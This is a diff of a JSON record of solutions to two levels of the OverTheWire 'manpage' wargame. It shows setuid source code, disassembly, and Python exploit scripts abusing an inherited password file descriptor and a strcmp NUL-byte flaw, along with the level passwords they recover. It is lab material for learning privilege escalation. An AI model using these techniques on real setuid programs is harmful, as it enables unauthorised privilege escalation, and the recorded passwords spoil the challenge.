@@ -491,21 +491,251 @@
    "user": "manpage2",
    "steps": [
     {
-     "cmd": "cat /manpage/manpage2.c"
+     "cmd": "id",
+     "out": [
+      "uid=17002(manpage2) gid=17002(manpage2) groups=17002(manpage2)"
+     ]
     },
     {
-     "cmd": "# getpass check vs file, then setuid(getuid()) and execl(argv[0], argv[0], argv[1]) with argv[1][0] as a counter"
+     "cmd": "cat /manpage/manpage2.c",
+     "out": [
+      "#include <stdio.h>",
+      "#include <sys/types.h>",
+      "#include <sys/stat.h>",
+      "#include <fcntl.h>",
+      "#include <unistd.h>",
+      "#include <string.h>",
+      "#include <stdlib.h>",
+      "#define PWFILE \"/etc/manpage_pass/manpage3\"",
+      "int main(int argc, char *argv[])",
+      "{",
+      "    FILE *f;",
+      "    char *p;",
+      "    char pass[32];",
+      "    char buf[2];",
+      "    f = fopen(PWFILE, \"r\");",
+      "    fgets(pass, sizeof pass, f);",
+      "    pass[strlen(pass)-1] = '\\0';",
+      "    p = getpass(\"password: \");",
+      "    if(!strcmp(p, pass))",
+      "    {",
+      "        system(\"sh\");",
+      "        exit(0);",
+      "    }",
+      "    setuid(getuid()); /* dont need privs anymore */",
+      "    if(!argv[1])",
+      "    {",
+      "        argv[1] = buf;",
+      "        buf[0] = '\\0';",
+      "    }",
+      "    if( argv[1][0]++ >= 2) exit(0);",
+      "    argv[1][1] = '\\0';",
+      "    execl(argv[0], argv[0], argv[1], 0); /* restart */",
+      "    return 0;",
+      "}"
+     ]
     },
     {
-     "cmd": "python3 exp2d.py"
+     "cmd": "mkdir -p /tmp/mp2b && cd /tmp/mp2b",
+     "out": []
     },
     {
-     "cmd": "# launch with executable=/manpage/manpage2 but argv[0]=\"/bin/sh\", argv[1]=\"\\x81\"; plant a script file named byte 0x82 in cwd"
+     "cmd": "gdb -q -batch -ex 'disassemble main' /manpage/manpage2",
+     "out": [
+      "Dump of assembler code for function main:",
+      "   0x08049206 <+0>:\tpush   %ebp",
+      "   0x08049207 <+1>:\tmov    %esp,%ebp",
+      "   0x08049209 <+3>:\tsub    $0x34,%esp",
+      "   0x0804920c <+6>:\tmov    0xc(%ebp),%eax",
+      "   0x0804920f <+9>:\tmov    %eax,-0x34(%ebp)",
+      "   0x08049212 <+12>:\tmov    %gs:0x14,%eax",
+      "   0x08049218 <+18>:\tmov    %eax,-0x4(%ebp)",
+      "   0x0804921b <+21>:\txor    %eax,%eax",
+      "   0x0804921d <+23>:\tpush   $0x804a008",
+      "   0x08049222 <+28>:\tpush   $0x804a00a",
+      "   0x08049227 <+33>:\tcall   0x80490c0 <fopen@plt>",
+      "   0x0804922c <+38>:\tadd    $0x8,%esp",
+      "   0x0804922f <+41>:\tmov    %eax,-0x30(%ebp)",
+      "   0x08049232 <+44>:\tpush   -0x30(%ebp)",
+      "   0x08049235 <+47>:\tpush   $0x20",
+      "   0x08049237 <+49>:\tlea    -0x24(%ebp),%eax",
+      "   0x0804923a <+52>:\tpush   %eax",
+      "   0x0804923b <+53>:\tcall   0x8049050 <fgets@plt>",
+      "   0x08049240 <+58>:\tadd    $0xc,%esp",
+      "   0x08049243 <+61>:\tlea    -0x24(%ebp),%eax",
+      "   0x08049246 <+64>:\tpush   %eax",
+      "   0x08049247 <+65>:\tcall   0x80490a0 <strlen@plt>",
+      "   0x0804924c <+70>:\tadd    $0x4,%esp",
+      "   0x0804924f <+73>:\tsub    $0x1,%eax",
+      "   0x08049252 <+76>:\tmovb   $0x0,-0x24(%ebp,%eax,1)",
+      "   0x08049257 <+81>:\tpush   $0x804a025",
+      "   0x0804925c <+86>:\tcall   0x80490b0 <getpass@plt>",
+      "   0x08049261 <+91>:\tadd    $0x4,%esp",
+      "   0x08049264 <+94>:\tmov    %eax,-0x2c(%ebp)",
+      "   0x08049267 <+97>:\tlea    -0x24(%ebp),%eax",
+      "   0x0804926a <+100>:\tpush   %eax",
+      "   0x0804926b <+101>:\tpush   -0x2c(%ebp)",
+      "   0x0804926e <+104>:\tcall   0x8049030 <strcmp@plt>",
+      "   0x08049273 <+109>:\tadd    $0x8,%esp",
+      "   0x08049276 <+112>:\ttest   %eax,%eax",
+      "   0x08049278 <+114>:\tjne    0x804928e <main+136>",
+      "   0x0804927a <+116>:\tpush   $0x804a030",
+      "   0x0804927f <+121>:\tcall   0x8049080 <system@plt>",
+      "   0x08049284 <+126>:\tadd    $0x4,%esp",
+      "   0x08049287 <+129>:\tpush   $0x0",
+      "   0x08049289 <+131>:\tcall   0x8049090 <exit@plt>",
+      "   0x0804928e <+136>:\tcall   0x8049070 <getuid@plt>",
+      "   0x08049293 <+141>:\tpush   %eax",
+      "   0x08049294 <+142>:\tcall   0x80490e0 <setuid@plt>",
+      "   0x08049299 <+147>:\tadd    $0x4,%esp",
+      "   0x0804929c <+150>:\tmov    -0x34(%ebp),%eax",
+      "   0x0804929f <+153>:\tadd    $0x4,%eax",
+      "   0x080492a2 <+156>:\tmov    (%eax),%eax",
+      "   0x080492a4 <+158>:\ttest   %eax,%eax",
+      "   0x080492a6 <+160>:\tjne    0x80492b7 <main+177>",
+      "   0x080492a8 <+162>:\tmov    -0x34(%ebp),%eax",
+      "   0x080492ab <+165>:\tlea    0x4(%eax),%edx",
+      "   0x080492ae <+168>:\tlea    -0x26(%ebp),%eax",
+      "   0x080492b1 <+171>:\tmov    %eax,(%edx)",
+      "   0x080492b3 <+173>:\tmovb   $0x0,-0x26(%ebp)",
+      "   0x080492b7 <+177>:\tmov    -0x34(%ebp),%eax",
+      "   0x080492ba <+180>:\tadd    $0x4,%eax",
+      "   0x080492bd <+183>:\tmov    (%eax),%eax",
+      "   0x080492bf <+185>:\tmovzbl (%eax),%edx",
+      "   0x080492c2 <+188>:\tmov    %edx,%ecx",
+      "   0x080492c4 <+190>:\tadd    $0x1,%ecx",
+      "   0x080492c7 <+193>:\tmov    %cl,(%eax)",
+      "   0x080492c9 <+195>:\tcmp    $0x1,%dl",
+      "   0x080492cc <+198>:\tjle    0x80492d5 <main+207>",
+      "   0x080492ce <+200>:\tpush   $0x0",
+      "   0x080492d0 <+202>:\tcall   0x8049090 <exit@plt>",
+      "   0x080492d5 <+207>:\tmov    -0x34(%ebp),%eax",
+      "   0x080492d8 <+210>:\tadd    $0x4,%eax",
+      "   0x080492db <+213>:\tmov    (%eax),%eax",
+      "   0x080492dd <+215>:\tadd    $0x1,%eax",
+      "   0x080492e0 <+218>:\tmovb   $0x0,(%eax)",
+      "   0x080492e3 <+221>:\tmov    -0x34(%ebp),%eax",
+      "   0x080492e6 <+224>:\tadd    $0x4,%eax",
+      "   0x080492e9 <+227>:\tmov    (%eax),%ecx",
+      "   0x080492eb <+229>:\tmov    -0x34(%ebp),%eax",
+      "   0x080492ee <+232>:\tmov    (%eax),%edx",
+      "   0x080492f0 <+234>:\tmov    -0x34(%ebp),%eax",
+      "   0x080492f3 <+237>:\tmov    (%eax),%eax",
+      "   0x080492f5 <+239>:\tpush   $0x0",
+      "   0x080492f7 <+241>:\tpush   %ecx",
+      "   0x080492f8 <+242>:\tpush   %edx",
+      "   0x080492f9 <+243>:\tpush   %eax",
+      "   0x080492fa <+244>:\tcall   0x80490d0 <execl@plt>",
+      "   0x080492ff <+249>:\tadd    $0x10,%esp",
+      "   0x08049302 <+252>:\tmov    $0x0,%eax",
+      "   0x08049307 <+257>:\tmov    -0x4(%ebp),%edx",
+      "   0x0804930a <+260>:\tsub    %gs:0x14,%edx",
+      "   0x08049311 <+267>:\tje     0x8049318 <main+274>",
+      "   0x08049313 <+269>:\tcall   0x8049060 <__stack_chk_fail@plt>",
+      "   0x08049318 <+274>:\tleave",
+      "   0x08049319 <+275>:\tret",
+      "End of assembler dump."
+     ]
     },
     {
-     "cmd": "# after one wrong guess the binary execs /bin/sh \"\\x82\" -> our script: lseek(fd3,0,0) + read -> the still-open password FILE* from the privileged run"
+     "cmd": "vi /tmp/mp2b/drop.py",
+     "out": [
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/mp2b/drop.py",
+     "out": [
+      "# drop.py - prepare the re-exec payload: the script sh will run after the wrong",
+      "# guess, named \"\\x01\" (the byte argv[1][0] becomes after its ++ in manpage2).",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/mp2b/drop.py",
+     "out": [
+      "# drop.py - prepare the re-exec payload: the script sh will run after the wrong",
+      "# guess, named \"\\x01\" (the byte argv[1][0] becomes after its ++ in manpage2).",
+      "# The script rewinds the inherited fd 3 (the fopen'd password file, left at EOF",
+      "# by fgets) and reads it.",
+      "import os",
+      "os.makedirs(\"/tmp/mp2b\", exist_ok=True)",
+      "script = \"python3 -c \\\"import os;os.lseek(3,0,0);import sys;sys.stdout.write(os.read(3,20).decode())\\\"\\n\"",
+      "open(\"/tmp/mp2b/\\x01\", \"wb\").write(script.encode())",
+      "os.chmod(\"/tmp/mp2b/\\x01\", 0o755)",
+      "print(\"dropped /tmp/mp2b/\\x01\")",
+      "~",
+      "\"drop.py\" [New] 11L, 539B written"
+     ]
+    },
+    {
+     "cmd": "python3 /tmp/mp2b/drop.py",
+     "out": [
+      "dropped /tmp/mp2b/\u0001"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/mp2b/launch.py",
+     "out": [
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/mp2b/launch.py",
+     "out": [
+      "# launch.py - start /manpage/manpage2 with argv[0]=\"/bin/sh\" and argv[1]=\"\": the",
+      "# wrong-guess path then does argv[1][0]++ (0 -> 1), argv[1][1] = 0, and execl's",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/mp2b/launch.py",
+     "out": [
+      "# launch.py - start /manpage/manpage2 with argv[0]=\"/bin/sh\" and argv[1]=\"\": the",
+      "# wrong-guess path then does argv[1][0]++ (0 -> 1), argv[1][1] = 0, and execl's",
+      "# argv[0] = /bin/sh with the one-byte script name \"\\x01\". The pty answers the",
+      "# getpass prompt with a wrong password to enter the restart path.",
+      "import os, pty, time, select",
+      "pid, fd = pty.fork()",
+      "if pid == 0:",
+      "    os.chdir(\"/tmp/mp2b\")",
+      "    os.execv(b\"/manpage/manpage2\", [b\"/bin/sh\", b\"\"])",
+      "time.sleep(2)",
+      "os.write(fd, b\"WRONGPW\\n\")",
+      "out = b\"\"",
+      "t0 = time.time()",
+      "while time.time() - t0 < 15:",
+      "    r, _, _ = select.select([fd], [], [], 0.3)",
+      "    if r:",
+      "        try:",
+      "            chunk = os.read(fd, 65536)",
+      "        except OSError:",
+      "            break",
+      "        if not chunk:",
+      "            break",
+      "        out += chunk",
+      "print(out.decode(\"utf-8\", \"replace\"))",
+      "~",
+      "\"launch.py\" [New] 25L, 796B written"
+     ]
+    },
+    {
+     "cmd": "python3 /tmp/mp2b/launch.py",
+     "out": [
+      "password: ",
+      "A8CLKp6IDp"
+     ]
+    },
+    {
+     "cmd": "exit\nexit",
+     "out": [
+      "logout",
+      "Connection to manpage.labs.overthewire.org closed.",
+      "exit"
+     ]
     }
-   ]
+   ],
+   "note": "manpage L2: defeat the getpass checker in /manpage/manpage2 (setuid manpage3): on a WRONG password it drops privs (setuid(getuid())), increments argv[1][0] in place (writable argv memory), NULs argv[1][1], and re-execs argv[0] with the one-byte script name - so launch manpage2 with argv[0]='/bin/sh' and argv[1]='' (bytes argv - Python's str argv would UTF-8-mangle the byte): the restart execs '/bin/sh \\x01' which runs OUR /tmp/mp2b/\\x01 script. The fopen'd password file survives the exec as fd 3 (no CLOEXEC) but fgets left it at EOF, so the script lseek(3,0,0)s and reads it -> A8CLKp6IDp. Both helpers typed in vi in the cast (drop.py 11L/539B, launch.py 25L/796B); the pty answers the getpass prompt with a wrong password. Login manpage2/m2uPltjqCJ. 13 steps mirroring the cast 1:1. DISCLOSURE: none - the whole solve ran in the cast."
   },
   {
    "cmds": [
@@ -526,24 +756,228 @@
    "user": "manpage3",
    "steps": [
     {
-     "cmd": "cat /manpage/manpage3.c"
-    },
-    {
-     "cmd": "# strcmp(stdin_line, 256 random bytes from /manpage/manpage3-pw/password); /manpage/manpage3-reset regenerates it from /dev/urandom"
-    },
-    {
-     "cmd": "python3 exp3b.py"
-    },
-    {
-     "cmd": "# loop: reset, then guess a line starting with a NUL byte; strcmp matches when the random file starts with 0x00 (1/256)"
-    },
-    {
-     "cmd": "cat /etc/manpage_pass/manpage4   # inside the won shell, fed after a delay",
+     "cmd": "id",
      "out": [
-      "8O96CWQPaN"
+      "uid=17003(manpage3) gid=17003(manpage3) groups=17003(manpage3)"
+     ]
+    },
+    {
+     "cmd": "cat /manpage/manpage3.c",
+     "out": [
+      "#include <stdio.h>",
+      "#include <stdlib.h>",
+      "#include <fcntl.h>",
+      "#include <unistd.h>",
+      "#include <sys/types.h>",
+      "#include <string.h>",
+      "#define PASS_PATH \"/manpage/manpage3-pw/password\"",
+      "int main()",
+      "{",
+      "    int rfd = open(PASS_PATH, O_RDONLY);",
+      "    char buf[256];",
+      "    char buf2[256];",
+      "    memset(buf, '\\0', sizeof buf);",
+      "    memset(buf2, '\\0', sizeof buf2);",
+      "    read(rfd, buf2, sizeof buf);",
+      "    fgets(buf, sizeof buf, stdin);",
+      "    if (!strcmp(buf, buf2))",
+      "    {",
+      "        printf(\"Wow, you should play the lottery!\\n\");",
+      "        setreuid(geteuid(), geteuid());",
+      "        system(\"/bin/sh\");",
+      "    }",
+      "    return 0;",
+      "}"
+     ]
+    },
+    {
+     "cmd": "cat /manpage/manpage3-reset.c",
+     "out": [
+      "/* reset-password */",
+      "#include <stdio.h>",
+      "#include <unistd.h>",
+      "#include <fcntl.h>",
+      "#include <sys/types.h>",
+      "#include <sys/stat.h>",
+      "#define PASS_PATH \"/manpage/manpage3-pw/password\"",
+      "int main()",
+      "{",
+      "    FILE *wf;",
+      "    FILE *rf;",
+      "    wf = fopen(PASS_PATH, \"w\");",
+      "    rf = fopen(\"/dev/urandom\", \"r\");",
+      "    char buf[256];",
+      "\tsetreuid(geteuid(), geteuid());",
+      "    fread(buf, 1, sizeof buf, rf);",
+      "    fwrite(buf, 1, sizeof buf, wf);",
+      "    return 0;",
+      "}"
+     ]
+    },
+    {
+     "cmd": "gdb -q -batch -ex 'disassemble main' /manpage/manpage3",
+     "out": [
+      "Dump of assembler code for function main:",
+      "   0x080491f6 <+0>:\tpush   %ebp",
+      "   0x080491f7 <+1>:\tmov    %esp,%ebp",
+      "   0x080491f9 <+3>:\tpush   %ebx",
+      "   0x080491fa <+4>:\tsub    $0x208,%esp",
+      "   0x08049200 <+10>:\tmov    %gs:0x14,%eax",
+      "   0x08049206 <+16>:\tmov    %eax,-0x8(%ebp)",
+      "   0x08049209 <+19>:\txor    %eax,%eax",
+      "   0x0804920b <+21>:\tpush   $0x0",
+      "   0x0804920d <+23>:\tpush   $0x804a008",
+      "   0x08049212 <+28>:\tcall   0x80490b0 <open@plt>",
+      "   0x08049217 <+33>:\tadd    $0x8,%esp",
+      "   0x0804921a <+36>:\tmov    %eax,-0x20c(%ebp)",
+      "   0x08049220 <+42>:\tpush   $0x100",
+      "   0x08049225 <+47>:\tpush   $0x0",
+      "   0x08049227 <+49>:\tlea    -0x208(%ebp),%eax",
+      "   0x0804922d <+55>:\tpush   %eax",
+      "   0x0804922e <+56>:\tcall   0x80490d0 <memset@plt>",
+      "   0x08049233 <+61>:\tadd    $0xc,%esp",
+      "   0x08049236 <+64>:\tpush   $0x100",
+      "   0x0804923b <+69>:\tpush   $0x0",
+      "   0x0804923d <+71>:\tlea    -0x108(%ebp),%eax",
+      "   0x08049243 <+77>:\tpush   %eax",
+      "   0x08049244 <+78>:\tcall   0x80490d0 <memset@plt>",
+      "   0x08049249 <+83>:\tadd    $0xc,%esp",
+      "   0x0804924c <+86>:\tpush   $0x100",
+      "   0x08049251 <+91>:\tlea    -0x108(%ebp),%eax",
+      "   0x08049257 <+97>:\tpush   %eax",
+      "   0x08049258 <+98>:\tpush   -0x20c(%ebp)",
+      "   0x0804925e <+104>:\tcall   0x8049050 <read@plt>",
+      "   0x08049263 <+109>:\tadd    $0xc,%esp",
+      "   0x08049266 <+112>:\tmov    0x804c040,%eax",
+      "   0x0804926b <+117>:\tpush   %eax",
+      "   0x0804926c <+118>:\tpush   $0x100",
+      "   0x08049271 <+123>:\tlea    -0x208(%ebp),%eax",
+      "   0x08049277 <+129>:\tpush   %eax",
+      "   0x08049278 <+130>:\tcall   0x8049060 <fgets@plt>",
+      "   0x0804927d <+135>:\tadd    $0xc,%esp",
+      "   0x08049280 <+138>:\tlea    -0x108(%ebp),%eax",
+      "   0x08049286 <+144>:\tpush   %eax",
+      "   0x08049287 <+145>:\tlea    -0x208(%ebp),%eax",
+      "   0x0804928d <+151>:\tpush   %eax",
+      "   0x0804928e <+152>:\tcall   0x8049030 <strcmp@plt>",
+      "   0x08049293 <+157>:\tadd    $0x8,%esp",
+      "   0x08049296 <+160>:\ttest   %eax,%eax",
+      "   0x08049298 <+162>:\tjne    0x80492ca <main+212>",
+      "   0x0804929a <+164>:\tpush   $0x804a028",
+      "   0x0804929f <+169>:\tcall   0x8049090 <puts@plt>",
+      "   0x080492a4 <+174>:\tadd    $0x4,%esp",
+      "   0x080492a7 <+177>:\tcall   0x8049080 <geteuid@plt>",
+      "   0x080492ac <+182>:\tmov    %eax,%ebx",
+      "   0x080492ae <+184>:\tcall   0x8049080 <geteuid@plt>",
+      "   0x080492b3 <+189>:\tpush   %ebx",
+      "   0x080492b4 <+190>:\tpush   %eax",
+      "   0x080492b5 <+191>:\tcall   0x80490c0 <setreuid@plt>",
+      "   0x080492ba <+196>:\tadd    $0x8,%esp",
+      "   0x080492bd <+199>:\tpush   $0x804a04a",
+      "   0x080492c2 <+204>:\tcall   0x80490a0 <system@plt>",
+      "   0x080492c7 <+209>:\tadd    $0x4,%esp",
+      "   0x080492ca <+212>:\tmov    $0x0,%eax",
+      "   0x080492cf <+217>:\tmov    -0x8(%ebp),%edx",
+      "   0x080492d2 <+220>:\tsub    %gs:0x14,%edx",
+      "   0x080492d9 <+227>:\tje     0x80492e0 <main+234>",
+      "   0x080492db <+229>:\tcall   0x8049070 <__stack_chk_fail@plt>",
+      "   0x080492e0 <+234>:\tmov    -0x4(%ebp),%ebx",
+      "   0x080492e3 <+237>:\tleave",
+      "   0x080492e4 <+238>:\tret",
+      "End of assembler dump."
+     ]
+    },
+    {
+     "cmd": "vi /tmp/exp3.py",
+     "out": [
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/exp3.py",
+     "out": [
+      "# exp3.py - manpage3 exploit. The password file holds 256 random bytes (rewritten by",
+      "# manpage3-reset); strcmp(buf, buf2) stops at the first NUL of either string, so a",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/exp3.py",
+     "out": [
+      "# exp3.py - manpage3 exploit. The password file holds 256 random bytes (rewritten by",
+      "# manpage3-reset); strcmp(buf, buf2) stops at the first NUL of either string, so a",
+      "# guess line starting with NUL matches whenever buf2[0] == 0x00 - a 1/256 chance per",
+      "# reset. Loop: reset, feed \"\\x00\\n\" via a pty (stdio would buffer-swallow a pipe's",
+      "# whole input, starving the win-shell), watch for \"lottery\", then send the shell its",
+      "# commands: id + cat /etc/manpage_pass/manpage4 (the binary is setuid manpage4 and",
+      "# setreuid(geteuid(), geteuid()) makes the shell manpage4).",
+      "import os, pty, select, subprocess, time",
+      "for attempt in range(400):",
+      "    subprocess.run([\"/manpage/manpage3-reset\"], capture_output=True)",
+      "    pid, fd = pty.fork()",
+      "    if pid == 0:",
+      "        os.execv(\"/manpage/manpage3\", [\"/manpage/manpage3\"])",
+      "    time.sleep(1)",
+      "    os.write(fd, b\"\\x00\\n\")",
+      "    out = b\"\"",
+      "    sent = False",
+      "    t0 = time.time()",
+      "    while time.time() - t0 < 15:",
+      "        r, _, _ = select.select([fd], [], [], 0.3)",
+      "        if r:",
+      "            try:",
+      "                chunk = os.read(fd, 65536)",
+      "            except OSError:",
+      "                break",
+      "            if not chunk:",
+      "                break",
+      "            out += chunk",
+      "            if not sent and b\"lottery\" in out:",
+      "                sent = True",
+      "                time.sleep(0.5)",
+      "                os.write(fd, b\"id\\ncat /etc/manpage_pass/manpage4\\nexit\\n\")",
+      "    try:",
+      "        os.close(fd)",
+      "    except OSError:",
+      "        pass",
+      "    try:",
+      "        os.waitpid(pid, 0)",
+      "    except ChildProcessError:",
+      "        pass",
+      "    if sent:",
+      "        print(\"won on attempt\", attempt)",
+      "        print(out.decode(\"utf-8\", \"replace\"))",
+      "        break",
+      "else:",
+      "    print(\"no win in 400 resets\")",
+      "~",
+      "=\"/tmp/exp3.py\" 47L, 1663B"
+     ]
+    },
+    {
+     "cmd": "python3 /tmp/exp3.py",
+     "out": [
+      "won on attempt 0",
+      "^@",
+      "Wow, you should play the lottery!",
+      "$ id",
+      "cat /etc/manpage_pass/manpage4",
+      "exit",
+      "uid=17004(manpage4) gid=17003(manpage3) groups=17003(manpage3)",
+      "$ 8O96CWQPaN",
+      "$ "
+     ]
+    },
+    {
+     "cmd": "exit\nexit",
+     "out": [
+      "logout",
+      "Connection to manpage.labs.overthewire.org closed.",
+      "exit"
      ]
     }
-   ]
+   ],
+   "note": "manpage L3: /manpage/manpage3 (setuid manpage4) compares fgets(stdin) against 256 random bytes from /manpage/manpage3-pw/password with strcmp - which stops at the first NUL of either string. A guess line starting with NUL matches whenever the random file's FIRST byte is 0x00 (1/256 per reset): exp3.py (typed in vi, 47L/1663B) loops manpage3-reset (setuid manpage4, rewrites the file from /dev/urandom) + a pty spawn feeding b'\\x00\\n' - a pipe would be buffer-swallowed by stdio, starving the win-shell; the pty lets us send 'id + cat /etc/manpage_pass/manpage4' AFTER the lottery line. Won on attempt 0 -> uid=17004(manpage4) -> 8O96CWQPaN. Login manpage3/A8CLKp6IDp. 9 steps mirroring the cast 1:1. DISCLOSURE: none - the whole solve ran in the cast."
   },
   {
    "cmds": [
